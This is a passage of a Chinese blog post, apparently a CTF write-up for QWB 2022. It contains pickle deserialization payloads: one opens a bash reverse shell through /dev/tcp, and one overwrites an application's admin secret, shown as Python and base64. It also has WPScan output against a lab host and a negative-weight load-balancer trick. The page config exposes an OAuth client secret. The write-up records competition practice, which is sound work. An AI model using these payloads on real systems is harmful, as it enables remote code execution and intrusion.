class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;source.txt&#x27;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>这里贴队友的wp</p>
<p>Pickle可以RCE <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a> ，直接修改cookie里的userdata报错500</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(data))</span><br></pre></td></tr></table></figure>

<p>加到userdata里面弹shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 覆盖admin.secrets</span></span><br><span class="line">payload = <span class="string">b&#x27;\x80\x03c__main__\nUser\n)\x81&#125;(V__setstate__\ncbuiltins\nexec\nubVc=&quot;import admin;admin.secr&quot;+&quot;et=\&#x27;1\&#x27;&quot;;exec(c)\nb.&#x27;</span></span><br><span class="line"><span class="comment"># 修改admin密码为1</span></span><br><span class="line">KGNidWlsdGlucwpleGVjClMnYz0iaW1wb3J0IGFkbWluO2FkbWluLnNlY3IiKyJldD0nMSciO2V4ZWMoYyknCm8u</span><br></pre></td></tr></table></figure>

<p>审计负载均衡代码<a target="_blank" rel="noopener" href="https://github.com/openresty/lua-restybalancer/blob/master/lib/resty/roundrobin.lua%EF%BC%8C%E6%BA%90%E7%A0%81%E6%9C%AA%E8%80%83%E8%99%91weight%E4%B8%BA%E8%B4%9F%E6%95%B0%E3%80%82%E6%9E%84%E9%80%A0weight%E4%B8%BA-1,0,-1">https://github.com/openresty/lua-restybalancer/blob/master/lib/resty/roundrobin.lua，源码未考虑weight为负数。构造weight为-1,0,-1</a> 即可。</p>
<p>大概就是这样 具体可参考pkucc的wp（ 我们就是pkucc</p>
<h2 id="WP-UM"><a href="#WP-UM" class="headerlink" title="WP-UM"></a>WP-UM</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> <span class="string">| Interesting Entries:</span></span><br><span class="line"> <span class="string">|  - Server: nginx/1.18.0</span></span><br><span class="line"> <span class="string">|  - X-Powered-By: PHP/7.3.22</span></span><br><span class="line"> <span class="string">| Found By: Headers (Passive Detection)</span></span><br><span class="line"> <span class="string">| Confidence: 100%</span></span><br><span class="line"></span><br><span class="line">[+] robots.txt found: http:<span class="comment">//192.168.0.102:30005/robots.txt</span></span><br><span class="line"> <span class="string">| Interesting Entries:</span></span><br><span class="line"> <span class="string">|  - /wp-admin/</span></span><br><span class="line"> <span class="string">|  - /wp-admin/admin-ajax.php</span></span><br><span class="line"> <span class="string">| Found By: Robots Txt (Aggressive Detection)</span></span><br><span class="line"> <span class="string">| Confidence: 100%</span></span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http:<span class="comment">//192.168.0.102:30005/xmlrpc.php</span></span><br><span class="line"> <span class="string">| Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"> <span class="string">| Confidence: 100%</span></span><br><span class="line"> <span class="string">| References:</span></span><br><span class="line"> <span class="string">|  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"> <span class="string">|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span></span><br><span class="line"> <span class="string">|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span></span><br><span class="line"> <span class="string">|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span></span><br><span class="line"> <span class="string">|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span></span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http:<span class="comment">//192.168.0.102:30005/readme.html</span></span><br><span class="line"> <span class="string">| Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"> <span class="string">| Confidence: 100%</span></span><br><span class="line"></span><br><span class="line">[+] Registration is enabled: http:<span class="comment">//192.168.0.102:30005/wp-login.php?action=register</span></span><br><span class="line"> <span class="string">| Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"> <span class="string">| Confidence: 100%</span></span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http:<span class="comment">//192.168.0.102:30005/wp-cron.php</span></span><br><span class="line"> <span class="string">| Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"> <span class="string">| Confidence: 60%</span></span><br><span class="line"> <span class="string">| References:</span></span><br><span class="line"> <span class="string">|  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"> <span class="string">|  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"></span><br><span class="line">[+] WordPress version <span class="number">6.0</span> identified (Outdated, released on <span class="number">2022</span>-<span class="number">05</span>-<span class="number">24</span>).</span><br><span class="line"> <span class="string">| Found By: Emoji Settings (Passive Detection)</span></span><br><span class="line"> <span class="string">|  - http://192.168.0.102:30005/, Match: &#x27;wp-includes\/js\/wp-emoji-release.min.js?ver=6.0&#x27;</span></span><br><span class="line"> <span class="string">| Confirmed By: Meta Generator (Passive Detection)</span></span><br><span class="line"> <span class="string">|  - http://192.168.0.102:30005/, Match: &#x27;WordPress 6.0&#x27;</span></span><br></pre></td></tr></table></figure>





<h2 id="uploadpro"><a href="#uploadpro" class="headerlink" title="uploadpro"></a>uploadpro</h2><blockquote>
<p><a target="_blank" rel="noopener" href="http://eci-2ze7r7wnzasxvptzchmd.cloudeci1.ichunqiu.com/phpinfo.php">http://eci-2ze7r7wnzasxvptzchmd.cloudeci1.ichunqiu.com/phpinfo.php</a></p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/223#toc-2">利用 PHP7 的 OPcache 执行 PHP 代码 - 先知社区 (aliyun.com)</a></p>
<p>没去做 知道这个东西就好</p>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>b1ue0cean
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="http://example.com/2022/07/30/qwb2022/" title="qwb2022">http://example.com/2022/07/30/qwb2022/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
        <a target="_blank" class="social-link" href="https://twitter.com/b1ue0cean7">
          <span class="icon">
            <i class="fab fa-twitter"></i>
          </span>

          <span class="label">Twitter</span>
        </a>
      </div>

      <div class="social-item">
        <a target="_blank" class="social-link" href="/atom.xml">
          <span class="icon">
            <i class=""></i>
          </span>

          <span class="label">RSS</span>
        </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/ctf/" rel="tag"># ctf</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/07/29/Generalizable%20and%20Interpretable%20Deep%20Learning%20for%20Network%20Congestion%20Prediction/" rel="prev" title="Generalizable and Interpretable Deep Learning for Network Congestion Prediction 论文阅读笔记">
                  <i class="fa fa-chevron-left"></i> Generalizable and Interpretable Deep Learning for Network Congestion Prediction 论文阅读笔记
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/07/30/HTB-Carrier/" rel="next" title="HTB Carrier">
                  HTB Carrier <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments gitalk-container"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  
<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  




<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"godrun666","repo":"godrun666.github.io","client_id":"7f8a0f5a5c88a0fea952","client_secret":"57250fa3a3b4cb1d0e0dad43bb1fffe7355d61a8","admin_user":"godrun666","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"f9d4065546cbcb2cf520856a4ed60fcc"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>

</body>
</html>
